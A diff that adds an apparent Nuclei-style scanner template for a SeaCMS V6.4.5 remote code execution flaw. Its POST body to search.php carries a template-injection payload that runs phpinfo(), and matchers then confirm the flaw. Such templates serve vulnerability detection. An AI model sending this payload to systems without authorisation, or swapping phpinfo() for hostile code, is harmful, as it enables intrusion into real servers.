@@ -1,0 +1,24 @@
+id: seacms-rce
+info:
+  author: pikpikcu
+  name: SeaCMS V6.4.5 RCE
+  reference: "https://mengsec.com/2018/08/06/SeaCMS-v6-45\u524D\u53F0\u4EE3\u7801\u6267\
+    \u884C\u6F0F\u6D1E\u5206\u6790/"
+  severity: high
+  tags: seacms,rce
+requests:
+- body: searchtype=5&order=}{end if} {if:1)phpinfo();if(1}{end if}
+  matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - phpinfo
+    - PHP Version
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: POST
+  path:
+  - '{{BaseURL}}/search.php?searchtype=5'
